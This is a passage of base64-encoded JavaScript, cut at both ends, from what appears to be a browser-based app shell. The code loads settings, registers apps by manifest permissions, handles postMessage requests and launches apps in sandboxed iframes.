SBkYXRhOw0KICAgICAgICAgICAgY2FsbGJhY2soKTsNCiAgICAgICAgICB9LmJpbmQodGhpcywgY2FsbGJhY2spDQogICAgICAgIH0pOw0KICAgICAgfSwNCiAgICAgIHVwbG9hZDogZnVuY3Rpb24oY2FsbGJhY2spIHsNCiAgICAgICAgZnMuZGVsZXRlKHsNCiAgICAgICAgICB0eXBlOiAnZmlsZScsDQogICAgICAgICAgcGF0aDogJy9kYXRhL2NvbmZpZy5qc29uJywNCiAgICAgICAgICBjYWxsYmFjazogZnVuY3Rpb24oKSB7DQogICAgICAgICAgICBmcy5uZXcoew0KICAgICAgICAgICAgICB0eXBlOiAnZmlsZScsDQogICAgICAgICAgICAgIHBhdGg6ICcvZGF0YS8nLA0KICAgICAgICAgICAgICBuYW1lOiAnY29uZmlnLmpzb24nLA0KICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeShtb2RlbC5zZXR0aW5ncy5jb25maWcpLA0KICAgICAgICAgICAgICBjYWxsYmFjazogY2FsbGJhY2suYmluZCh0aGlzKQ0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgfS5iaW5kKHRoaXMpDQogICAgICAgIH0pOw0KICAgICAgfQ0KICAgIH0sDQogICAgcGVybWlzc2lvbnM6IHt9DQogIH07DQoNCiAgY29udHJvbGxlciA9IHsNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgIGxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSg2KTsNCiAgICAgIGxvYWRpbmdTY3JlZW4uc2V0TWVzc2FnZSgnSW5pdGlhbGl6aW5nIENvbnRyb2xsZXIuLi4nKTsNCiAgICAgIG1vZGVsLmluaXQoKTsNCiAgICAgIHZpZXcuaW5pdCgpOw0KICAgICAgd2luZG93LmFsbG93ZWRNZXRob2RzID0ge307DQogICAgICBPYmplY3QuYXNzaWduKHdpbmRvdy5hbGxvd2VkTWV0aG9kcywgbW9kZWwuYXBwcy5nZXRBbGxvd2VkTWV0aG9kcygpKTsNCiAgICAgIE9iamVjdC5mcmVlemUod2luZG93LmFsbG93ZWRNZXRob2RzKTsNCiAgICAgIG1vZGVsLnNldHRpbmdzLmxvYWQoZnVuY3Rpb24oKSB7DQogICAgICAgIHRoaXMuYXBwcy5pbml0KCk7DQogICAgICB9LmJpbmQodGhpcykpOw0KICAgIH0sDQogICAgdG1wRmlsZTogZnVuY3Rpb24oZGF0YSwgY2FsbGJhY2spIHsNCiAgICAgIGZzLnRtcEZpbGUoZGF0YSwgY2FsbGJhY2spOw0KICAgIH0sDQogICAgZ2V0U1ZHOiBmdW5jdGlvbihpY29uKSB7DQogICAgICByZXR1cm4gbW9kZWwuZ2V0SWNvKGljb24gKyAnLnN2ZycpOw0KICAgIH0sDQogICAgYWRkSGlzdG9yeTogZnVuY3Rpb24odGl0bGUsIFVJRCkgew0KICAgICAgbW9kZWwuaGlzdG9yeS5wdXNoKHRpdGxlKTsNCiAgICB9LA0KICAgIGNsZWFySGlzdG9yeTogZnVuY3Rpb24oVUlEKSB7DQogICAgICBtb2RlbC5oaXN0b3J5ID0gW107DQogICAgfSwNCiAgICBnZXRIaXN0b3J5OiBmdW5jdGlvbihVSUQpIHsNCiAgICAgIHJldHVybiBtb2RlbC5oaXN0b3J5Ow0KICAgIH0sDQogICAgYXBwczogew0KICAgICAgaW5pdDogZnVuY3Rpb24oKSB7DQogICAgICAgIC8qUnVucyBhZnRlciBhbGwgc3R5bGVzIGFyZSBsb2FkZWQgYW5kIGNvbmZpZ3VyYXRpb24gZGF0YSBpcyBsb2FkZWQqLw0KICAgICAgICBpZiAodGhpcy5sb2FkZWQpIHsNCiAgICAgICAgICBsb2FkaW5nU2NyZWVuLnNldFBlcmNlbnRhZ2UoMjYpOw0KICAgICAgICAgIGxvYWRpbmdTY3JlZW4uc2V0TWVzc2FnZSgnUXVlcnlpbmcgQXBwcy4uLicpOw0KICAgICAgICAgIG1vZGVsLmFwcHMuZ2V0QWxsKGZ1bmN0aW9uKGFwcHMpIHsNCiAgICAgICAgICAgIGxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSg2MCk7DQogICAgICAgICAgICBsb2FkaW5nU2NyZWVuLnNldE1lc3NhZ2UoJ0luaXRpYWxpemluZyBBcHBzLi4uJyk7DQogICAgICAgICAgICB2YXIgYWxsUGVybWlzc2lvbnMgPSB7DQogICAgICAgICAgICAgICdERUZBVUxUX0hPTUUnOiBmdW5jdGlvbihhcHApIHsNCiAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgdmFyIGFwcENvbmZpZyA9IHsNCiAgICAgICAgICAgICAgICAgICAgbWFuaWZlc3Q6IGFwcC5tYW5pZmVzdCwNCiAgICAgICAgICAgICAgICAgICAgYWN0aXZpdHk6IGFwcC5tYW5pZmVzdC5hY3Rpdml0aWVzLmhvbWUsDQogICAgICAgICAgICAgICAgICAgIHBhdGg6IGFwcC5wYXRoLA0KICAgICAgICAgICAgICAgICAgICB0eXBlOiBhcHAudHlwZQ0KICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgIGlmICghbW9kZWwucGVybWlzc2lvbnMuREVGQVVMVF9IT01FKSB7DQogICAgICAgICAgICAgICAgICAgIG1vZGVsLnBlcm1pc3Npb25zLkRFRkFVTFRfSE9NRSA9IFtdOw0KICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgbW9kZWwucGVybWlzc2lvbnMuREVGQVVMVF9IT01FLnB1c2goYXBwQ29uZmlnKTsNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0ludmFsaWQgaG9tZSBjb25maWd1cmF0aW9uLicsIGVycik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAnTElTVF9QQUNLQUdFUyc6IGZ1bmN0aW9uKGFwcCkgew0KICAgICAgICAgICAgICAgIGlmICh0aGlzLl9MSVNUX1BBQ0tBR0VTKSB7DQogICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHRoaXMuX0xJU1RfUEFDS0FHRVMgPSB0cnVlOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdtZXNzYWdlJywgZnVuY3Rpb24obXNnKSB7DQogICAgICAgICAgICAgICAgICBpZiAobXNnLmRhdGEucmVxdWVzdCAhPSAnTElTVF9QQUNLQUdFUycpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgdmFyIG9yaWdpbiA9IG1zZy5zb3VyY2UubG9jYXRpb24ucGF0aG5hbWUuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICAgIHZhciBhcHBUeXBlID0gb3JpZ2luWzBdOw0KICAgICAgICAgICAgICAgICAgdmFyIGFwcE5hbWUgPSBvcmlnaW5bM107DQogICAgICAgICAgICAgICAgICB2YXIgYXBwOw0KICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IG1vZGVsLmFwcHMuYXBwcy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICAgICAgICAgICAgICBsZXQgY3VyclBhdGggPSBtb2RlbC5hcHBzLmFwcHNbaV0ucGF0aC5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoYXBwTmFtZSA9PSBjdXJyUGF0aFszXSAmJiBhcHBUeXBlID09IGN1cnJQYXRoWzBdKSB7DQogICAgICAgICAgICAgICAgICAgICAgYXBwID0gbW9kZWwuYXBwcy5hcHBzW2ldOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICBpZiAoYXBwKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChhcHAubWFuaWZlc3QucGVybWlzc2lvbnMuaW5jbHVkZXMoJ0xJU1RfUEFDS0FHRVMnKSkgew0KICAgICAgICAgICAgICAgICAgICAgIG1vZGVsLmFwcHMuZ2V0QWxsKGZ1bmN0aW9uKGFwcHMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1zZy5zb3VyY2UucG9zdE1lc3NhZ2Uoew0KICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0OiAnTElTVF9QQUNLQUdFUycsDQogICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IGFwcHMNCiAgICAgICAgICAgICAgICAgICAgICAgIH0sICcqJyk7DQogICAgICAgICAgICAgICAgICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICBtc2cuc291cmNlLnBvc3RNZXNzYWdlKG5ldyBFcnJvcignIkxJU1RfUEFDS0FHRVMiIG5vdCBpbiBtYW5pZmVzdCBwZXJtaXNzaW9ucy4nKSwgJyonKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgbXNnLnNvdXJjZS5wb3N0TWVzc2FnZShuZXcgRXJyb3IoJ0ludmFsaWQgT3JpZ2luOiAnICsgbXNnLnNvdXJjZS5sb2NhdGlvbi5wYXRobmFtZSksICcqJyk7DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSwgZmFsc2UpOw0KICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAnTEFVTkNIX1BBQ0tBR0VTJzogZnVuY3Rpb24oYXBwKSB7DQogICAgICAgICAgICAgICAgaWYgKHRoaXMuX0xBVU5DSF9QQUNLQUdFUykgew0KICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB0aGlzLl9MQVVOQ0hfUEFDS0FHRVMgPSB0cnVlOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdtZXNzYWdlJywgZnVuY3Rpb24obXNnKSB7DQogICAgICAgICAgICAgICAgICBpZiAobXNnLmRhdGEucmVxdWVzdCAhPSAnTEFVTkNIX1BBQ0tBR0VTJykgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICB2YXIgb3JpZ2luID0gbXNnLnNvdXJjZS5sb2NhdGlvbi5wYXRobmFtZS5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgICAgdmFyIGFwcFR5cGUgPSBvcmlnaW5bMF07DQogICAgICAgICAgICAgICAgICB2YXIgYXBwTmFtZSA9IG9yaWdpblszXTsNCiAgICAgICAgICAgICAgICAgIHZhciBhcHA7DQogICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gbW9kZWwuYXBwcy5hcHBzLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBjdXJyUGF0aCA9IG1vZGVsLmFwcHMuYXBwc1tpXS5wYXRoLnNwbGl0KCcvJyk7DQogICAgICAgICAgICAgICAgICAgIGlmIChhcHBOYW1lID09IGN1cnJQYXRoWzNdICYmIGFwcFR5cGUgPT0gY3VyclBhdGhbMF0pIHsNCiAgICAgICAgICAgICAgICAgICAgICBhcHAgPSBtb2RlbC5hcHBzLmFwcHNbaV07DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgIGlmIChhcHApIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGFwcC5tYW5pZmVzdC5wZXJtaXNzaW9ucy5pbmNsdWRlcygnTEFVTkNIX1BBQ0tBR0VTJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICBtc2cuZGF0YS5kYXRhLmJhY2tncm91bmQgPSAhIW1zZy5kYXRhLmRhdGEuYmFja2dyb3VuZDsNCiAgICAgICAgICAgICAgICAgICAgICBsZXQgcmVzdWx0ID0gY29udHJvbGxlci5hcHBzLm9wZW4obXNnLmRhdGEuZGF0YS5VSUQsIG1zZy5kYXRhLmRhdGEuYWN0aXZpdHksIG1zZy5kYXRhLmRhdGEuYmFja2dyb3VuZCk7DQogICAgICAgICAgICAgICAgICAgICAgbXNnLnNvdXJjZS5wb3N0TWVzc2FnZSh7DQogICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0OiAnTEFVTkNIX1BBQ0tBR0VTJywNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHJlc3VsdA0KICAgICAgICAgICAgICAgICAgICAgIH0sICcqJyk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgbXNnLnNvdXJjZS5wb3N0TWVzc2FnZShuZXcgRXJyb3IoJyJMQVVOQ0hfUEFDS0FHRVMiIG5vdCBpbiBtYW5pZmVzdCBwZXJtaXNzaW9ucy4nKSwgJyonKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgbXNnLnNvdXJjZS5wb3N0TWVzc2FnZShuZXcgRXJyb3IoJ0ludmFsaWQgT3JpZ2luOiAnICsgbXNnLnNvdXJjZS5sb2NhdGlvbi5wYXRobmFtZSksICcqJyk7DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSwgZmFsc2UpOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgdmFyIGhhbmRsZVNlY3RvciA9IGZ1bmN0aW9uKGFwcHMpIHsNCiAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gYXBwcy5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICBpZiAoYXBwc1tpXS5tYW5pZmVzdC5hY3Rpdml0aWVzLm1haW4pIHsNCiAgICAgICAgICAgICAgICAgICAgdmlldy5oYW1idXJnZXJNZW51LmFkZChhcHBzW2ldKTsNCiAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUud2FybignTWlzc2luZyBNYWluIGFjdGl2aXR5Jyk7DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICBsZXQgaWluZGV4ID0gYXBwc1tpXS5tYW5pZmVzdC5wZXJtaXNzaW9ucy5sZW5ndGg7DQogICAgICAgICAgICAgICAgICBmb3IgKGxldCBpbmRleCA9IDA7IGluZGV4ICE9IGlpbmRleDsgaW5kZXgrKykgew0KICAgICAgICAgICAgICAgICAgICBsZXQgcGVybWlzc2lvbk5hbWUgPSBhcHBzW2ldLm1hbmlmZXN0LnBlcm1pc3Npb25zW2luZGV4XTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGFsbFBlcm1pc3Npb25zW3Blcm1pc3Npb25OYW1lXSkgew0KICAgICAgICAgICAgICAgICAgICAgIGFsbFBlcm1pc3Npb25zW3Blcm1pc3Npb25OYW1lXShhcHBzW2ldKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLndhcm4oJ1VucmVjb2duaXplZCBvciB1bm5lY2Nlc3NhcnkgcGVybWlzc2lvbjogJywNCiAgICAgICAgICAgICAgICAgICAgICAgIHBlcm1pc3Npb25OYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignSW52YWxpZCBNYW5pZmVzdCBDb25maWd1cmF0aW9uLicsDQogICAgICAgICAgICAgICAgICAgICdObyBhY3Rpdml0aWVzIHdpbGwgYmUgYWRkZWQuJywgZXJyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH07DQogICAgICAgICAgICBmb3IgKGxldCBpIGluIGFwcHMpIHsNCiAgICAgICAgICAgICAgbGV0IGdyb3VwID0gYXBwc1tpXTsNCiAgICAgICAgICAgICAgaGFuZGxlU2VjdG9yKGdyb3VwKTsNCiAgICAgICAgICAgICAgbW9kZWwuYXBwcy5hcHBzID0gbW9kZWwuYXBwcy5hcHBzLmNvbmNhdChtb2RlbC5hcHBzLmFwcHMsIGdyb3VwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSg3MCk7DQogICAgICAgICAgICBsb2FkaW5nU2NyZWVuLnNldE1lc3NhZ2UoJ1N0YXJ0aW5nIEFwcHMuLi4nKTsNCiAgICAgICAgICAgIHZpZXcucmVxdWVzdENob29zZXIucmVxdWVzdCgnREVGQVVMVF9IT01FJywgew0KICAgICAgICAgICAgICBleGNsdXNpdmU6IGZhbHNlDQogICAgICAgICAgICB9LCBmdW5jdGlvbihlbGlnaWJsZUFwcCkgew0KICAgICAgICAgICAgICBjb250cm9sbGVyLmFwcHMub3BlbihlbGlnaWJsZUFwcC5tYW5pZmVzdC5VSUQsICdob21lJywgZmFsc2UpOw0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICBsb2FkaW5nU2NyZWVuLnNldFBlcmNlbnRhZ2UoMTAwKTsNCiAgICAgICAgICAgICAgbG9hZGluZ1NjcmVlbi5zZXRNZXNzYWdlKCdEb25lIScpOw0KICAgICAgICAgICAgfSwgMTAwKTsNCiAgICAgICAgICB9KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICB0aGlzLmxvYWRlZCA9IHRydWU7DQogICAgICAgIH0NCiAgICAgIH0sDQogICAgICBsYXVuY2g6IGZ1bmN0aW9uKGFwcCkgew0KICAgICAgICBpZiAoYXBwLm1hbmlmZXN0LmFjdGl2aXRpZXMgJiYgYXBwLm1hbmlmZXN0LmFjdGl2aXRpZXMubWFpbikgew0KICAgICAgICAgIGNvbnRyb2xsZXIuYXBwcy5vcGVuKGFwcC5tYW5pZmVzdC5VSUQsICdtYWluJywgZmFsc2UpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIGNvbnNvbGUud2FybignTm8gbWFpbiBBY3Rpdml0eSBmb3VuZCwgY2FuXCd0IGxhdW5jaC4nKTsNCiAgICAgICAgfQ0KICAgICAgfSwNCiAgICAgIG9wZW46IGZ1bmN0aW9uKGFwcFVJRCwgYWN0aXZpdHksIGJhY2tncm91bmQpIHsNCiAgICAgICAgdmFyIGFwcExlbmd0aCA9IG1vZGVsLmFwcHMuYXBwcy5sZW5ndGg7DQogICAgICAgIGZvciAobGV0IGkgPSAwOyBpICE9IGFwcExlbmd0aDsgaSsrKSB7DQogICAgICAgICAgLy8gQWxsIEFwcHMgTGlzdA0KICAgICAgICAgIGlmIChtb2RlbC5hcHBzLmFwcHNbaV0ubWFuaWZlc3QuVUlEID09IGFwcFVJRCkgew0KICAgICAgICAgICAgbGV0IGFwcCA9IG1vZGVsLmFwcHMuYXBwc1tpXTsNCiAgICAgICAgICAgIGlmIChhcHAubWFuaWZlc3QuYWN0aXZpdGllc1thY3Rpdml0eV0pIHsNCiAgICAgICAgICAgICAgbGV0IHNhbmRib3ggPSAnYWxsb3ctZm9ybXMgYWxsb3ctcG9pbnRlci1sb2NrIGFsbG93LXNjcmlwdHMgYWxsb3ctc2FtZS1vcmlnaW4nOw0KICAgICAgICAgICAgICBpZiAoYmFja2dyb3VuZCkgew0KICAgICAgICAgICAgICAgIGlmICghYXBwLnJ1bm5pbmcpIHsNCiAgICAgICAgICAgICAgICAgIGFwcC5ydW5uaW5nID0gJ2JhY2tncm91bmQnOw0KICAgICAgICAgICAgICAgICAgYXBwLmZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7DQogICAgICAgICAgICAgICAgICBhcHAuZnJhbWUuc2V0QXR0cmlidXRlKCdzYW5kYm94Jywgc2FuZGJveCk7DQogICAgICAgICAgICAgICAgICBhcHAuZnJhbWUuc3JjID0gYXBwLnBhdGg7DQogICAgICAgICAgICAgICAgICBhcHAuZnJhbWUuc3JjICs9IGFwcC5tYW5pZmVzdC5hY3Rpdml0aWVzW2FjdGl2aXR5XS5wYXRoOw0KICAgICAgICAgICAgICAgICAgdmlldy5pZnJhbWVDb250YWluZXIuYXBwZW5kQ2hpbGQoYXBwLmZyYW1lKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgbGV0IGlpbmRleCA9IG1vZGVsLmFwcHMuYXBwcy5sZW5ndGg7DQogICAgICAgICAgICAgICAgZm9yIChsZXQgaW5kZXggPSAwOyBpbmRleCAhPSBpaW5kZXg7IGluZGV4KyspIHsNCiAgICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYXBwcy5jbG9zZShtb2RlbC5hcHBzLmFwcHNbaW5kZXhdLCBmYWxzZSk7DQogICAgICAgICAgICAgICAgICBtb2RlbC5hcHBzLmFwcHNbaW5kZXhdLm1lbnVFbnRyeS5jbGFzc05hbWUgPSAnaGFtYnVyZ2VySXRlbSc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGFwcC5tZW51RW50cnkuY2xhc3NOYW1lID0gJ2hhbWJ1cmdlckl0ZW0gYWN0aXZlJzsNCiAgICAgICAgICAgICAgICBpZiAoIWFwcC5ydW5uaW5nKSB7DQogICAgICAgICAgICAgICAgICBhcHAucnVubmluZyA9ICdmb3JlZ3JvdW5kJzsNCiAgICAgICAgICAgICAgICAgIGFwcC5mcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOw0KICAgICAgICAgICAgICAgICAgYXBwLmZyYW1lLnNldEF0dHJpYnV0ZSgnc2FuZGJveCcsIHNhbmRib3gpOw0KICAgICAgICAgICAgICAgICAgYXBwLmZyYW1lLnNyYyA9IGFwcC5wYXRoOw0KICAgICAgICAgICAgICAgICAgYXBwLmZyYW1lLnNyYyArPSBhcHAubWFuaWZlc3QuYWN0aXZpdGllc1thY3Rpdml0eV0ucGF0aDsNCiAgICAgICAgICAgICAgICAgIHZpZXcuaWZyYW1lQ29udGFpbmVyLmFwcGVuZENoaWxkKGFwcC5mcmFtZSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgIGlmIChhcHAucnVubmluZyA9PSAnYmFja2dyb3VuZCcpIHsNCiAgICAgICAgICAgICAgICAgICAgYXBwLmZyYW1lLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgICAgICAgICBhcHAucnVubmluZyA9ICdmb3JlZ3JvdW5kJzsNCiAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICBjb25zb2xlLndhcm4oJ05vIG1hdGNoaW5nIGFjdGl2aXR5IGZvdW5kIGZvcicgKyBhY3Rpdml0eSk7DQogICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0sDQogICAgICBjbG9zZTogZnVuY3Rpb24oYXBwT2JqLCBmb3JjZVN0b3ApIHsNCiAgICAgICAgaWYgKGZvcmNlU3RvcCkgew0KICAgICAgICAgIGlmIChhcHBPYmouZnJhbWUpIHsNCiAgICAgICAgICAgIHZpZXcuaWZyYW1lQ29udGFpbmVyLnJlbW92ZUNoaWxkKGFwcE9iai5mcmFtZSk7DQogICAgICAgICAgICBhcHBPYmoucnVubmluZyA9IGZhbHNlOw0KICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICBpZiAoYXBwT2JqLmZyYW1lKSB7DQogICAgICAgICAgICBhcHBPYmouZnJhbWUuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGFwcE9iai5ydW5uaW5nID0gJ2JhY2tncm91bmQnOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0sDQogICAgYWN0aXZpdHlNYXRjaDogZnVuY3Rpb24oYWN0aXZpdHksIGNhbGxiYWNrKSB7DQogICAgICB2YXIgdmFsaWRBcHA7DQogICAgICB2YXIgcmVBc2sgPSBmYWxzZTsNCiAgICAgIHZhciBsb2NhbFBlcm1pc3Npb25zID0gbW9kZWwucGVybWlzc2lvbnM7DQogICAgICB2YXIgc2F2ZWRQZXJtaXNzaW9ucyA9IG1vZGVsLnNldHRpbmdzLmNvbmZpZy5wZXJtaXNzaW9uczsNCiAgICAgIGlmIChsb2NhbFBlcm1pc3Npb25zW2FjdGl2aXR5XS5sZW5ndGggPT09IDApIHsNCiAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdObyBhcHAgY2FwYWJsZSBvZiBvcGVuaW5nICcgKyBhY3Rpdml0eSk7DQogICAgICB9IGVsc2UgaWYgKGxvY2FsUGVybWlzc2lvbnNbYWN0aXZpdHldLmxlbmd0aCA9PT0gMSkgew0KICAgICAgICBsb2NhbFBlcm1pc3Npb25zW2FjdGl2aXR5XVswXS5kZWZhdWx0ID0gdHJ1ZTsNCiAgICAgICAgc2F2ZWRQZXJtaXNzaW9uc1thY3Rpdml0eV0gPSBsb2NhbFBlcm1pc3Npb25zW2FjdGl2aXR5XTsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIHJlQXNrID0gdHJ1ZTsNCiAgICAgIH0NCiAgICAgIHZhciBpaSA9IGxvY2FsUGVybWlzc2lvbnNbYWN0aXZpdHldLmxlbmd0aDsNCiAgICAgIGZvciAobGV0IGkgPSAwOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgaWYgKGxvY2FsUGVybWlzc2lvbnNbYWN0aXZpdHldW2ldLmRlZmF1bHQpIHsNCiAgICAgICAgICB2YWxpZEFwcCA9IGxvY2FsUGVybWlzc2lvbnNbYWN0aXZpdHldW2ldOw0KICAgICAgICAgIHJlQXNrID0gZmFsc2U7DQogICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIG1vZGVsLnNldHRpbmdzLnVwbG9hZChjYWxsYmFjay5iaW5kKHRoaXMsIHJlQXNrLCB2YWxpZEFwcCkpOw0KICAgIH0NCiAgfTsNCg0KICB2aWV3ID0gew0KICAgIHNldFN0eWxlOiBmdW5jdGlvbigpIHsNCiAgICAgIHZhciBDU1NFbGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGluaycpOw0KICAgICAgQ1NTRWxlbS50eXBlID0gJ3RleHQvY3NzJzsNCiAgICAgIENTU0VsZW0ucmVsID0gJ3N0eWxlc2hlZXQnOw0KICAgICAgQ1NTRWxlbS5ocmVmID0gJ3N5c3RlbS9yZXMvc3R5bGVzL2ZyYW1ld29yay5jc3MnOw0KICAgICAgQ1NTRWxlbS5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSgzMCk7DQogICAgICAgIGxvYWRpbmdTY3JlZW4uc2V0TWVzc2FnZSgnU3R5bGVzIExvYWRlZCEnKTsNCiAgICAgICAgY29udHJvbGxlci5hcHBzLmluaXQoKTsNCiAgICAgIH0pOw0KICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChDU1NFbGVtKTsNCiAgICB9LA0KICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgbG9hZGluZ1NjcmVlbi5zZXRQZXJjZW50YWdlKDMyKTsNCiAgICAgIGxvYWRpbmdTY3JlZW4uc2V0TWVzc2FnZSgnSW5pdGlhbGl6aW5nIFZpZXcuLi4nKTsNCiAgICAgIHRoaXMuc2V0U3R5bGUoKTsNCiAgICAgIHRoaXMucmliYm9uQmFyLmluaXQoKTsNCiAgICAgIHRoaXMuaGFtYnVyZ2VyTWVudS5pbml0KCk7DQogICAgICB2aWV3Lm92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgIHZpZXcub3ZlcmxheS5jbGFzc05hbWUgPSAnb3ZlcmxheSBvX2RlYWN0aXZhdGVkJzsNCiAgICAgIHZpZXcub3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgdmlldy5vdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICAgICAgdmlldy5oYW1idXJnZXJNZW51LmlzT3BlbiA9IHRydWU7DQogICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS50b2dnbGUoKTsNCiAgICAgICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7DQogICAgICB9KTsNCiAgICAgIHZpZXcub3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCd0cmFuc2l0aW9uZW5kJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGlmICh0aGlzLmNsYXNzTmFtZSA9PSAnb3ZlcmxheSBvX